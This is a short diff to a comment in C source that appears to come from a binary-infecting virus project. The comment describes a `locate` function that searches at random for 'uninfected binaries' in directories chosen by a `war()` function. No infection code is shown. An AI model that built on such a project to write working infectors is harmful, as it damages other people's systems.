@@ -2,7 +2,7 @@
 
 /*
   Locate search aleatory for uninfected binaries.
-  Look at war() func to know which directories are in use.
+  Look at war() func to know which directories are pre-selected.
 */
 
 void	locate(t_data *data, t_directory *dir)
